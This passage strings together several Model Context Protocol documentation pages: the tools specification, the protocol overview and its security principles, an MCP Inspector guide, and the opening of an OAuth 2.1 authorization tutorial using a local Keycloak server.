Invocation\n    Client->>Server: tools/call\n    Server-->>Client: Tool result\n    Client->>LLM: Process result\n\n    Note over Client,Server: Updates\n    Server--)Client: tools/list_changed\n    Client->>Server: tools/list\n    Server-->>Client: Updated tools\n```\n\n## Data Types\n\n### Tool\n\nA tool definition includes:\n\n- `name`: Unique identifier for the tool\n- `title`: Optional human-readable name of the tool for display purposes.\n- `description`: Human-readable description of functionality\n- `inputSchema`: JSON Schema defining expected parameters\n  - Follows the [JSON Schema usage guidelines](/specification/draft/basic#json-schema-usage)\n  - Defaults to 2020-12 if no `$schema` field is present\n  - **MUST** be a valid JSON Schema object (not `null`)\n  - For tools with no parameters, use one of these valid approaches:\n    - `{ \"type\": \"object\", \"additionalProperties\": false }` - **Recommended**: explicitly accepts only empty objects\n    - `{ \"type\": \"object\" }` - accepts any object (including with properties)\n- `outputSchema`: Optional JSON Schema defining expected output structure\n  - Follows the [JSON Schema usage guidelines](/specification/draft/basic#json-schema-usage)\n  - Defaults to 2020-12 if no `$schema` field is present\n- `annotations`: Optional properties describing tool behavior\n\n<Warning>\n  For trust & safety and security, clients **MUST** consider tool annotations to\n  be untrusted unless they come from trusted servers.\n</Warning>\n\n#### Tool Names\n\n- Tool names **SHOULD** be between 1 and 128 characters in length (inclusive).\n- Tool names **SHOULD** be considered case-sensitive.\n- The following **SHOULD** be the only allowed characters: uppercase and lowercase ASCII letters (A-Z, a-z), digits\n  (0-9), underscore (\\_), hyphen (-), and dot (.)\n- Tool names **SHOULD NOT** contain spaces, commas, or other special characters.\n- Tool names **SHOULD** be unique within a server.\n- Example valid tool names:\n  - getUser\n  - DATA_EXPORT_v2\n  - admin.tools.list\n\n### Tool Result\n\nTool results may contain [**structured**](#structured-content) or **unstructured** content.\n\n**Unstructured** content is returned in the `content` field of a result, and can contain multiple content items of different types:\n\n<Note>\n  All content types (text, image, audio, resource links, and embedded resources)\n  support optional\n  [annotations](/specification/draft/server/resources#annotations) that provide\n  metadata about audience, priority, and modification times. This is the same\n  annotation format used by resources and prompts.\n</Note>\n\n#### Text Content\n\n```json\n{\n  \"type\": \"text\",\n  \"text\": \"Tool result text\"\n}\n```\n\n#### Image Content\n\n```json\n{\n  \"type\": \"image\",\n  \"data\": \"base64-encoded-data\",\n  \"mimeType\": \"image/png\",\n  \"annotations\": {\n    \"audience\": [\"user\"],\n    \"priority\": 0.9\n  }\n}\n```\n\n#### Audio Content\n\n```json\n{\n  \"type\": \"audio\",\n  \"data\": \"base64-encoded-audio-data\",\n  \"mimeType\": \"audio/wav\"\n}\n```\n\n#### Resource Links\n\nA tool **MAY** return links to [Resources](/specification/draft/server/resources), to provide additional context\nor data. In this case, the tool will return a URI that can be subscribed to or fetched by the client:\n\n```json\n{\n  \"type\": \"resource_link\",\n  \"uri\": \"file:///project/src/main.rs\",\n  \"name\": \"main.rs\",\n  \"description\": \"Primary application entry point\",\n  \"mimeType\": \"text/x-rust\"\n}\n```\n\nResource links support the same [Resource annotations](/specification/draft/server/resources#annotations) as regular resources to help clients understand how to use them.\n\n<Info>\n  Resource links returned by tools are not guaranteed to appear in the results\n  of a `resources/list` request.\n</Info>\n\n#### Embedded Resources\n\n[Resources](/specification/draft/server/resources) **MAY** be embedded to provide additional context\nor data using a suitable [URI scheme](./resources#common-uri-schemes). Servers that use embedded resources **SHOULD** implement the `resources` capability:\n\n```json\n{\n  \"type\": \"resource\",\n  \"resource\": {\n    \"uri\": \"file:///project/src/main.rs\",\n    \"mimeType\": \"text/x-rust\",\n    \"text\": \"fn main() {\\n    println!(\\\"Hello world!\\\");\\n}\",\n    \"annotations\": {\n      \"audience\": [\"user\", \"assistant\"],\n      \"priority\": 0.7,\n      \"lastModified\": \"2025-05-03T14:30:00Z\"\n    }\n  }\n}\n```\n\nEmbedded resources support the same [Resource annotations](/specification/draft/server/resources#annotations) as regular resources to help clients understand how to use them.\n\n#### Structured Content\n\n**Structured** content is returned as a JSON object in the `structuredContent` field of a result.\n\nFor backwards compatibility, a tool that returns structured content SHOULD also return the serialized JSON in a TextContent block.\n\n#### Output Schema\n\nTools may also provide an output schema for validation of structured results.\nIf an output schema is provided:\n\n- Servers **MUST** provide structured results that conform to this schema.\n- Clients **SHOULD** validate structured results against this schema.\n\nExample tool with output schema:\n\n```json\n{\n  \"name\": \"get_weather_data\",\n  \"title\": \"Weather Data Retriever\",\n  \"description\": \"Get current weather data for a location\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"location\": {\n        \"type\": \"string\",\n        \"description\": \"City name or zip code\"\n      }\n    },\n    \"required\": [\"location\"]\n  },\n  \"outputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"temperature\": {\n        \"type\": \"number\",\n        \"description\": \"Temperature in celsius\"\n      },\n      \"conditions\": {\n        \"type\": \"string\",\n        \"description\": \"Weather conditions description\"\n      },\n      \"humidity\": {\n        \"type\": \"number\",\n        \"description\": \"Humidity percentage\"\n      }\n    },\n    \"required\": [\"temperature\", \"conditions\", \"humidity\"]\n  }\n}\n```\n\nExample valid response for this tool:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"{\\\"temperature\\\": 22.5, \\\"conditions\\\": \\\"Partly cloudy\\\", \\\"humidity\\\": 65}\"\n      }\n    ],\n    \"structuredContent\": {\n      \"temperature\": 22.5,\n      \"conditions\": \"Partly cloudy\",\n      \"humidity\": 65\n    }\n  }\n}\n```\n\nProviding an output schema helps clients and LLMs understand and properly handle structured tool outputs by:\n\n- Enabling strict schema validation of responses\n- Providing type information for better integration with programming languages\n- Guiding clients and LLMs to properly parse and utilize the returned data\n- Supporting better documentation and developer experience\n\n### Schema Examples\n\n#### Tool with default 2020-12 schema:\n\n```json\n{\n  \"name\": \"calculate_sum\",\n  \"description\": \"Add two numbers\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"a\": { \"type\": \"number\" },\n      \"b\": { \"type\": \"number\" }\n    },\n    \"required\": [\"a\", \"b\"]\n  }\n}\n```\n\n#### Tool with explicit draft-07 schema:\n\n```json\n{\n  \"name\": \"calculate_sum\",\n  \"description\": \"Add two numbers\",\n  \"inputSchema\": {\n    \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n    \"type\": \"object\",\n    \"properties\": {\n      \"a\": { \"type\": \"number\" },\n      \"b\": { \"type\": \"number\" }\n    },\n    \"required\": [\"a\", \"b\"]\n  }\n}\n```\n\n#### Tool with no parameters:\n\n```json\n{\n  \"name\": \"get_current_time\",\n  \"description\": \"Returns the current server time\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"additionalProperties\": false\n  }\n}\n```\n\n## Error Handling\n\nTools use two error reporting mechanisms:\n\n1. **Protocol Errors**: Standard JSON-RPC errors for issues like:\n   - Unknown tools\n   - Malformed requests (requests that fail to satisfy [CallToolRequest schema](specification/draft/schema#calltoolrequest))\n   - Server errors\n\n2. **Tool Execution Errors**: Reported in tool results with `isError: true`:\n   - API failures\n   - Input validation errors (e.g., date in wrong format, value out of range)\n   - Business logic errors\n\n**Tool Execution Errors** contain actionable feedback that language models can use to self-correct and retry with adjusted parameters.\n**Protocol Errors** indicate issues with the request structure itself that models are less likely to be able to fix.\nClients **SHOULD** provide tool execution errors to language models to enable self-correction.\nClients **MAY** provide protocol errors to language models, though these are less likely to result in successful recovery.\n\nExample protocol error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Unknown tool: invalid_tool_name\"\n  }\n}\n```\n\nExample tool execution error (input validation):\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Invalid departure date: must be in the future. Current date is 08/08/2025.\"\n      }\n    ],\n    \"isError\": true\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST**:\n   - Validate all tool inputs\n   - Implement proper access controls\n   - Rate limit tool invocations\n   - Sanitize tool outputs\n\n2. Clients **SHOULD**:\n   - Prompt for user confirmation on sensitive operations\n   - Show tool inputs to the user before calling the server, to avoid malicious or\n     accidental data exfiltration\n   - Validate tool results before passing to LLM\n   - Implement timeouts for tool calls\n   - Log tool usage for audit purposes\n"}

Whether you're building an AI-powered IDE, enhancing a chat interface, or creating\ncustom AI workflows, MCP provides a standardized way to connect LLMs with the context\nthey need.\n\nThis specification defines the authoritative protocol requirements, based on the\nTypeScript schema in\n[schema.ts](https://github.com/modelcontextprotocol/specification/blob/main/schema/draft/schema.ts).\n\nFor implementation guides and examples, visit\n[modelcontextprotocol.io](https://modelcontextprotocol.io).\n\nThe key words \"MUST\", \"MUST NOT\", \"REQUIRED\", \"SHALL\", \"SHALL NOT\", \"SHOULD\", \"SHOULD\nNOT\", \"RECOMMENDED\", \"NOT RECOMMENDED\", \"MAY\", and \"OPTIONAL\" in this document are to be\ninterpreted as described in [BCP 14](https://datatracker.ietf.org/doc/html/bcp14)\n[[RFC2119](https://datatracker.ietf.org/doc/html/rfc2119)]\n[[RFC8174](https://datatracker.ietf.org/doc/html/rfc8174)] when, and only when, they\nappear in all capitals, as shown here.\n\n## Overview\n\nMCP provides a standardized way for applications to:\n\n- Share contextual information with language models\n- Expose tools and capabilities to AI systems\n- Build composable integrations and workflows\n\nThe protocol uses [JSON-RPC](https://www.jsonrpc.org/) 2.0 messages to establish\ncommunication between:\n\n- **Hosts**: LLM applications that initiate connections\n- **Clients**: Connectors within the host application\n- **Servers**: Services that provide context and capabilities\n\nMCP takes some inspiration from the\n[Language Server Protocol](https://microsoft.github.io/language-server-protocol/), which\nstandardizes how to add support for programming languages across a whole ecosystem of\ndevelopment tools. In a similar way, MCP standardizes how to integrate additional context\nand tools into the ecosystem of AI applications.\n\n## Key Details\n\n### Base Protocol\n\n- [JSON-RPC](https://www.jsonrpc.org/) message format\n- Stateful connections\n- Server and client capability negotiation\n\n### Features\n\nServers offer any of the following features to clients:\n\n- **Resources**: Context and data, for the user or the AI model to use\n- **Prompts**: Templated messages and workflows for users\n- **Tools**: Functions for the AI model to execute\n\nClients may offer the following features to servers:\n\n- **Sampling**: Server-initiated agentic behaviors and recursive LLM interactions\n- **Roots**: Server-initiated inquiries into URI or filesystem boundaries to operate in\n- **Elicitation**: Server-initiated requests for additional information from users\n\n### Additional Utilities\n\n- Configuration\n- Progress tracking\n- Cancellation\n- Error reporting\n- Logging\n\n## Security and Trust & Safety\n\nThe Model Context Protocol enables powerful capabilities through arbitrary data access\nand code execution paths. With this power comes important security and trust\nconsiderations that all implementors must carefully address.\n\n### Key Principles\n\n1. **User Consent and Control**\n   - Users must explicitly consent to and understand all data access and operations\n   - Users must retain control over what data is shared and what actions are taken\n   - Implementors should provide clear UIs for reviewing and authorizing activities\n\n2. **Data Privacy**\n   - Hosts must obtain explicit user consent before exposing user data to servers\n   - Hosts must not transmit resource data elsewhere without user consent\n   - User data should be protected with appropriate access controls\n\n3. **Tool Safety**\n   - Tools represent arbitrary code execution and must be treated with appropriate\n     caution.\n     - In particular, descriptions of tool behavior such as annotations should be\n       considered untrusted, unless obtained from a trusted server.\n   - Hosts must obtain explicit user consent before invoking any tool\n   - Users should understand what each tool does before authorizing its use\n\n4. **LLM Sampling Controls**\n   - Users must explicitly approve any LLM sampling requests\n   - Users should control:\n     - Whether sampling occurs at all\n     - The actual prompt that will be sent\n     - What results the server can see\n   - The protocol intentionally limits server visibility into prompts\n\n### Implementation Guidelines\n\nWhile MCP itself cannot enforce these security principles at the protocol level,\nimplementors **SHOULD**:\n\n1. Build robust consent and authorization flows into their applications\n2. Provide clear documentation of security implications\n3. Implement appropriate access controls and data protections\n4. Follow security best practices in their integrations\n5. Consider privacy implications in their feature designs\n\n## Learn More\n\nExplore the detailed specification for each protocol component:\n\n<CardGroup cols={5}>\n  <Card\n    title=\"Architecture\"\n    icon=\"sitemap\"\n    href=\"/specification/draft/architecture\"\n  />\n  <Card title=\"Base Protocol\" icon=\"code\" href=\"/specification/draft/basic\" />\n  <Card\n    title=\"Server Features\"\n    icon=\"server\"\n    href=\"/specification/draft/server\"\n  />\n  <Card\n    title=\"Client Features\"\n    icon=\"user\"\n    href=\"/specification/draft/client\"\n  />\n  <Card title=\"Contributing\" icon=\"pencil\" href=\"/development/contributing\" />\n</CardGroup>\n"}

While the [Debugging Guide](/legacy/tools/debugging) covers the Inspector as part of the overall debugging toolkit, this document provides a detailed exploration of the Inspector's features and capabilities.\n\n## Getting started\n\n### Installation and basic usage\n\nThe Inspector runs directly through `npx` without requiring installation:\n\n```bash\nnpx @modelcontextprotocol/inspector <command>\n```\n\n```bash\nnpx @modelcontextprotocol/inspector <command> <arg1> <arg2>\n```\n\n#### Inspecting servers from npm or PyPI\n\nA common way to start server packages from [npm](https://npmjs.com) or [PyPI](https://pypi.org).\n\n<Tabs>\n\n  <Tab title=\"npm package\">\n\n```bash\nnpx -y @modelcontextprotocol/inspector npx <package-name> <args>\n# For example\nnpx -y @modelcontextprotocol/inspector npx @modelcontextprotocol/server-filesystem /Users/username/Desktop\n```\n\n  </Tab>\n\n  <Tab title=\"PyPI package\">\n\n```bash\nnpx @modelcontextprotocol/inspector uvx <package-name> <args>\n# For example\nnpx @modelcontextprotocol/inspector uvx mcp-server-git --repository ~/code/mcp/servers.git\n```\n\n  </Tab>\n</Tabs>\n\n#### Inspecting locally developed servers\n\nTo inspect servers locally developed or downloaded as a repository, the most common\nway is:\n\n<Tabs>\n  <Tab title=\"TypeScript\">\n\n```bash\nnpx @modelcontextprotocol/inspector node path/to/server/index.js args...\n```\n\n  </Tab>\n  <Tab title=\"Python\">\n\n```bash\nnpx @modelcontextprotocol/inspector \\\n  uv \\\n  --directory path/to/server \\\n  run \\\n  package-name \\\n  args...\n```\n\n  </Tab>\n</Tabs>\n\nPlease carefully read any attached README for the most accurate instructions.\n\n## Feature overview\n\n<Frame caption=\"The MCP Inspector interface\">\n  <img src=\"/images/mcp-inspector.png\" />\n</Frame>\n\nThe Inspector provides several features for interacting with your MCP server:\n\n### Server connection pane\n\n- Allows selecting the [transport](/legacy/concepts/transports) for connecting to the server\n- For local servers, supports customizing the command-line arguments and environment\n\n### Resources tab\n\n- Lists all available resources\n- Shows resource metadata (MIME types, descriptions)\n- Allows resource content inspection\n- Supports subscription testing\n\n### Prompts tab\n\n- Displays available prompt templates\n- Shows prompt arguments and descriptions\n- Enables prompt testing with custom arguments\n- Previews generated messages\n\n### Tools tab\n\n- Lists available tools\n- Shows tool schemas and descriptions\n- Enables tool testing with custom inputs\n- Displays tool execution results\n\n### Notifications pane\n\n- Presents all logs recorded from the server\n- Shows notifications received from the server\n\n## Best practices\n\n### Development workflow\n\n1. Start Development\n   - Launch Inspector with your server\n   - Verify basic connectivity\n   - Check capability negotiation\n\n2. Iterative testing\n   - Make server changes\n   - Rebuild the server\n   - Reconnect the Inspector\n   - Test affected features\n   - Monitor messages\n\n3. Test edge cases\n   - Invalid inputs\n   - Missing prompt arguments\n   - Concurrent operations\n   - Verify error handling and error responses\n\n## Next steps\n\n<CardGroup cols={2}>\n    <Card\n        title=\"Inspector Repository\"\n        icon=\"github\"\n        href=\"https://github.com/modelcontextprotocol/inspector\"\n    >\n        Check out the MCP Inspector source code\n    </Card>\n\n    <Card\n        title=\"Debugging Guide\"\n        icon=\"bug\"\n        href=\"/legacy/tools/debugging\"\n    >\n        Learn about broader debugging strategies\n    </Card>\n\n</CardGroup>\n"}

Just as USB-C provides a standardized way to connect electronic devices, MCP provides a standardized way to connect AI applications to external systems.\n\n<Frame>\n  <img src=\"/images/mcp-simple-diagram.png\" />\n</Frame>\n\n## What can MCP enable?\n\n- Agents can access your Google Calendar and Notion, acting as a more personalized AI assistant.\n- Claude Code can generate an entire web app using a Figma design.\n- Enterprise chatbots can connect to multiple databases across an organization, empowering users to analyze data using chat.\n- AI models can create 3D designs on Blender and print them out using a 3D printer.\n\n## Why does MCP matter?\n\nDepending on where you sit in the ecosystem, MCP can have a range of benefits.\n\n- **Developers**: MCP reduces development time and complexity when building, or integrating with, an AI application or agent.\n- **AI applications or agents**: MCP provides access to an ecosystem of data sources, tools and apps which will enhance capabilities and improve the end-user experience.\n- **End-users**: MCP results in more capable AI applications or agents which can access your data and take actions on your behalf when necessary.\n\n## Start Building\n\n<CardGroup cols={2}>\n  <Card title=\"Build servers\" icon=\"server\" href=\"/docs/develop/build-server\">\n    Create MCP servers to expose your data and tools\n  </Card>\n\n  <Card title=\"Build clients\" icon=\"computer\" href=\"/docs/develop/build-client\">\n    Develop applications that connect to MCP servers\n  </Card>\n</CardGroup>\n\n## Learn more\n\n<CardGroup cols={2}>\n  <Card title=\"Understand concepts\" icon=\"book\" href=\"/docs/learn/architecture\">\n    Learn the core concepts and architecture of MCP\n  </Card>\n</CardGroup>\n"}
{"source":"github","repo":"mcp-spec","path":"docs/docs/tutorials/security/authorization.mdx","content":"---\ntitle: Understanding Authorization in MCP\ndescription: Learn how to implement secure authorization for MCP servers using OAuth 2.1 to protect sensitive resources and operations\n---\n\nAuthorization in the Model Context Protocol (MCP) secures access to sensitive resources and operations exposed by MCP servers. If your MCP server handles user data or administrative actions, authorization ensures only permitted users can access its endpoints.\n\nMCP uses standardized authorization flows to build trust between MCP clients and MCP servers. Its design doesn't focus on one specific authorization or identity system, but rather follows the conventions outlined for [OAuth 2.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13). For detailed information, see the [Authorization specification](/specification/latest/basic/authorization).\n\n## When Should You Use Authorization?\n\nWhile authorization for MCP servers is **optional**, it is strongly recommended when:\n\n- Your server accesses user-specific data (emails, documents, databases)\n- You need to audit who performed which actions\n- Your server grants access to its APIs that require user consent\n- You're building for enterprise environments with strict access controls\n- You want to implement rate limiting or usage tracking per user\n\n<Tip>\n**Authorization for Local MCP Servers**\n\nFor MCP servers using the [STDIO transport](/specification/latest/basic/transports#stdio), you can use environment-based credentials or credentials provided by third-party libraries embedded directly in the MCP server instead. Because a STDIO-built MCP server runs locally, it has access to a range of flexible options when it comes to acquiring user credentials that may or may not rely on in-browser authentication and authorization flows.\n\nOAuth flows, in turn, are designed for HTTP-based transports where the MCP server is remotely-hosted and the client uses OAuth to establish that a user is authorized to access said remote server.\n\n</Tip>\n\n## The Authorization Flow: Step by Step\n\nLet's walk through what happens when a client wants to connect to your protected MCP server:\n\n<Steps>\n<Step title=\"Initial Handshake\">\nWhen your MCP client first tries to connect, your server responds with a `401 Unauthorized` and tells the client where to find authorization information, captured in a [Protected Resource Metadata (PRM) document](https://datatracker.ietf.org/doc/html/rfc9728). The document is hosted by the MCP server, follows a predictable path pattern, and is provided to the client in the `resource_metadata` parameter within the `WWW-Authenticate` header.\n\n```http\nHTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer realm=\"mcp\",\n  resource_metadata=\"https://your-server.com/.well-known/oauth-protected-resource\"\n```\n\nThis tells the client that authorization is required for the MCP server and where to get the necessary information to kickstart the authorization flow.\n\n</Step>\n\n<Step title=\"Protected Resource Metadata Discovery\">\nWith the URI pointer to the PRM document, the client will fetch the metadata to learn about the authorization server, supported scopes, and other resource information. The data is typically encapsulated in a JSON blob, similar to the one below.\n\n```json\n{\n  \"resource\": \"https://your-server.com/mcp\",\n  \"authorization_servers\": [\"https://auth.your-server.com\"],\n  \"scopes_supported\": [\"mcp:tools\", \"mcp:resources\"]\n}\n```\n\nYou can see a more comprehensive example in [RFC 9728 Section 3.2](https://datatracker.ietf.org/doc/html/rfc9728#name-protected-resource-metadata-r).\n\n</Step>\n\n<Step title=\"Authorization Server Discovery\">\nNext, the client discovers what the authorization server can do by fetching its metadata. If the PRM document lists more than one authorization server, the client can decide which one to use.\n\nWith an authorization server selected, the client will then construct a standard metadata URI and issue a request to the [OpenID Connect (OIDC) Discovery](https://openid.net/specs/openid-connect-discovery-1_0.html) or [OAuth 2.0 Auth Server Metadata](https://datatracker.ietf.org/doc/html/rfc8414) endpoints (depending on authorization server support)\nand retrieve another set of metadata properties that will allow it to know the endpoints it needs to complete the authorization flow.\n\n```json\n{\n  \"issuer\": \"https://auth.your-server.com\",\n  \"authorization_endpoint\": \"https://auth.your-server.com/authorize\",\n  \"token_endpoint\": \"https://auth.your-server.com/token\",\n  \"registration_endpoint\": \"https://auth.your-server.com/register\"\n}\n```\n\n</Step>\n\n<Step title=\"Client Registration\">\nWith all the metadata out of the way, the client now needs to make sure that it's registered with the authorization server. This can be done in two ways.\n\nFirst, the client can be **pre-registered** with a given authorization server, in which case it can have embedded client registration information that it uses to complete the authorization flow.\n\nAlternatively, the client can use **Dynamic Client Registration** (DCR) to dynamically register itself with the authorization server. The latter scenario requires the authorization server to support DCR. If the authorization server does support DCR, the client will send a request to the `registration_endpoint` with its information:\n\n```json\n{\n  \"client_name\": \"My MCP Client\",\n  \"redirect_uris\": [\"http://localhost:3000/callback\"],\n  \"grant_types\": [\"authorization_code\", \"refresh_token\"],\n  \"response_types\": [\"code\"]\n}\n```\n\nIf the registration succeeds, the authorization server will return a JSON blob with client registration information.\n\n<Tip>\n**No DCR or Pre-Registration**\n\nIn case an MCP client connects to an MCP server that doesn't use an authorization server that supports DCR and the client is not pre-registered with said authorization server, it's the responsibility of the client developer to provide an affordance for the end-user to enter client information manually.\n\n</Tip>\n\n</Step>\n\n<Step title=\"User Authorization\">\nThe client will now need to open a browser to the `/authorize` endpoint, where the user can log in and grant the required permissions. The authorization server will then redirect back to the client with an authorization code that the client exchanges for tokens:\n\n```json\n{\n  \"access_token\": \"eyJhbGciOiJSUzI1NiIs...\",\n  \"refresh_token\": \"def502...\",\n  \"token_type\": \"Bearer\",\n  \"expires_in\": 3600\n}\n```\n\nThe access token is what the client will use to authenticate requests to the MCP server. This step follows standard [OAuth 2.1 authorization code with PKCE](https://oauth.net/2/grant-types/authorization-code/) conventions.\n\n</Step>\n\n<Step title=\"Making Authenticated Requests\">\nFinally, the client can make requests to your MCP server using the access token embedded in the `Authorization` header:\n\n```http\nGET /mcp HTTP/1.1\nHost: your-server.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIs...\n```\n\nThe MCP server will need to validate the token and process the request if the token is valid and has the required permissions.\n\n</Step>\n</Steps>\n\n## Implementation Example\n\nTo get started with a practical implementation, we will use a [Keycloak](https://www.keycloak.org/) authorization server hosted in a Docker container. Keycloak is an open-source authorization server that can be easily deployed locally for testing and experimentation.\n\nMake sure that you download and install [Docker Desktop](https://www.docker.com/products/docker-desktop/). We will need it to deploy Keycloak on our development machine.\n\n### Keycloak Setup\n\nFrom your terminal application, run the following command to start the Keycloak container:\n\n```bash\ndocker run -p 127.0.0.1:8080:8080 -e KC_BOOTSTRAP_ADMIN_USERNAME=admin -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak start-dev\n```\n\nThis command will pull the Keycloak container image locally and bootstrap the basic configuration. It will run on port `8080` and have an `admin` user with `admin` password.\n\n<Warning>\n**Not for Production**\n\nThe configuration above may be suitable for testing and experimentation; however, you should never use it in production. Refer to the [Configuring Keycloak for production](https://www.keycloak.org/server/configuration-production) guide for additional details on how to deploy the authorization server for scenarios that require reliability, security, and high availability.\n\n</Warning>\n\nYou will be able to access the Keycloak authorization server from your browser at `http://localhost:8080`.\n\n<Frame>\n  <img\n    src=\"/images/tutorial-authorization/keycloak-browser.png\"\n    alt=\"Keycloak admin dashboard authentication dialog.\"\n  />\n</Frame>\n\nWhen running with the default configuration, Keycloak will already support many of the capabilities that we need for MCP servers, including Dynamic Client Registration. You can check this by looking at the OIDC configuration, available at:\n\n```http\nhttp://localhost:8080/realms/master/.well-known/openid-configuration\n```\n\nWe will also need to set up Keycloak to support our scopes and allow our host (local machine) to dynamically register clients, as the default policies restrict anonymous dynamic client registration.\n\nGo to **Client scopes** in the Keycloak dashboard and create a new `mcp:tools` scope. We will use this to access all of the tools on our MCP server.\n\n<Frame>\n  <img\n    src=\"/images/tutorial-authorization/keycloak-scopes.png\"\n    alt=\"Configuring Keycloak scopes.\"\n  />\n</Frame>\n\nAfter creating the scope, make sure that you assign its type to **Default** and have flipped the **Include in token scope** switch, as this will be needed for token validation.\n\nLet's now also set up an **audience** for our Keycloak-issued tokens. An audience is important to configure because it embeds the intended destination directly into the issued access token. This helps your MCP server to verify that the token it got was actually meant for it rather than some other API. This is key to help avoid token passthrough scenarios.\n\nTo do this, open your `mcp:tools` client scope and click on **Mappers**, followed by **Configure a new mapper**. Select **Audience**.\n\n<Frame>\n  <img\n    src=\"/images/tutorial-authorization/scope-add-audience.gif\"\n    alt=\"Configuring an audience for a token in Keycloak.\"\n  />\n</Frame>\n\nFor **Name**, use `audience-config`. Add a value for **Included Custom Audience**, set to `http://localhost:3000`. This will be the URI of our test server.\n\n<Warning>\n**Not for Production**\n\nThe audience configuration above is meant for testing. For production scenarios, additional set-up and configuration will be required to ensure that audiences are properly constrained for issued tokens. Specifically, the audience needs to be based on the resource parameter passed from the client, not a fixed value.\n\n</Warning>\n\nNow, navigate to **Clients**, then **Client registration**, and then **Trusted Hosts**. Disable the **Client URIs Must Match** setting and add the hosts from which you're testing. You can get your current host IP by running the `ifconfig` command on Linux or macOS, or `ipconfig` on Windows. You can see the IP address you need to add by looking at the keycloak logs for a line that looks like `Failed to verify remote host : 192.168.215.1`. Check that the IP address is associated with your host. This may be for a bridge network depending on your docker setup.\n\n<Frame>\n  <img\n    src=\"/images/tutorial-authorization/keycloak-client.gif\"\n    alt=\"Setting up client registration details in Keycloak.\"\n  />\n</Frame>\n\n<Warning>\n**Getting the Host**\n\nIf you are running Keycloak from a container, you will also be able to see the host IP from the Terminal in the container logs.\n\n</Warning>\n\nLastly, we need to register a new client that we can use with the **MCP server itself** to talk to Keycloak for things like [token introspection](https://oauth.net/2/token-introspection/). To do that:\n\n1. Go to **Clients**.\n1. Click **Create client**.\n1. Give your client a unique **Client ID** and click **Next**.\n1. Enable **Client authentication** and click **Next**.\n1. Click **Save**.\n\nWorth noting that token introspection is just _one of_ the available approaches to validate tokens. This can also be done with the help of standalone libraries, specific to each language and platform.\n\nWhen you open the client details, go to **Credentials** and take note of the **Client Secret**.\n\n<Frame>\n  <img\n    src=\"/images/tutorial-authorization/keycloak-client-auth.gif\"\n    alt=\"Creating a new client in Keycloak.\"\n  />\n</Frame>\n\n<Warning>\n**Handling Secrets**\n\nNever embed client credentials directly in your code. We recommend using environment variables or specialized solutions for secret storage.\n\n</Warning>\n\nWith Keycloak configured, every time the authorization flow is triggered, your MCP server will receive a token like this:\n\n```text\neyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI1TjcxMGw1WW5MWk13WGZ1VlJKWGtCS3ZZMzZzb3JnRG5scmlyZ2tlTHlzIn0.eyJleHAiOjE3NTU1NDA4MTcsImlhdCI6MTc1NTU0MDc1NywiYXV0aF90aW1lIjoxNzU1NTM4ODg4LCJqdGkiOiJvbnJ0YWM6YjM0MDgwZmYtODQwNC02ODY3LTgxYmUtMTIzMWI1MDU5M2E4IiwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDo4MDgwL3JlYWxtcy9tYXN0ZXIiLCJhdWQiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJzdWIiOiIzM2VkNmM2Yi1jNmUwLTQ5MjgtYTE2MS1mMmY2OWM3YTAzYjkiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiI3OTc1YTViNi04YjU5LTRhODUtOWNiYS04ZmFlYmRhYjg5NzQiLCJzaWQiOiI4ZjdlYzI3Ni0zNThmLTRjY2MtYjMxMy1kYjA4MjkwZjM3NmYiLCJzY29wZSI6Im1jcDp0b29scyJ9.P5xCRtXORly0R0EXjyqRCUx-z3J4uAOWNAvYtLPXroykZuVCCJ-K1haiQSwbURqfsVOMbL7jiV-sD6miuPzI1tmKOkN_Yct0Vp-azvj7U5rEj7U6tvPfMkg2Uj_jrIX0KOskyU2pVvGZ-5BgqaSvwTEdsGu_V3_E0xDuSBq2uj_wmhqiyTFm5lJ1WkM3Hnxxx1_AAnTj7iOKMFZ4VCwMmk8hhSC7clnDauORc0sutxiJuYUZzxNiNPkmNeQtMCGqWdP1igcbWbrfnNXhJ6NswBOuRbh97_QraET3hl-CNmyS6C72Xc0aOwR_uJ7xVSBTD02OaQ1JA6kjCATz30kGYg\n```\n\nDecoded, it will look like this:\n\n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"5N710l5YnLZMwXfuVRJXkBKvY36sorgDnlrirgkeLys\"\n}.{\n  \"exp\": 1755540817,\n  \"iat\": 1755540757,\n  \"auth_time\": 1755538888,\n  \"jti\": \"onrtac:b34080ff-8404-6867-81be-1231b50593a8\",\n  \"iss\": \"http://localhost:8080/realms/master\",\n  \"aud\": \"http://localhost:3000\",\n  \"sub\": \"33ed6c6b-c6e0-4928-a161-f2f69c7a03b9\",\n  \"typ\": \"Bearer\",\n  \"azp\": \"7975a5b6-8b59-4a85-9cba-8faebdab8974\",\n  \"sid\": \"8f7ec276-358f-4ccc-b313-db08290f376f\",\n  \"scope\": \"mcp:tools\"\n}.[Signature]\n```\n\n<Warning>\n**Embedded Audience**\n\nNotice the `aud` claim embedded in the token - it's currently set to be the URI of the test MCP server and it's inferred from the scope that we've previously configured. This will be important in our implementation to validate.\n\n</Warning>\n\n### MCP Server Setup\n\nWe will now set up our MCP server to use the locally-running Keycloak authorization server. Depending on your programming language preference, you can use one of the supported [MCP SDKs](/docs/sdk).\n\nFor our testing purposes, we will create an extremely simple MCP server that exposes two tools - one for addition and another for multiplication. The server will require authorization to access 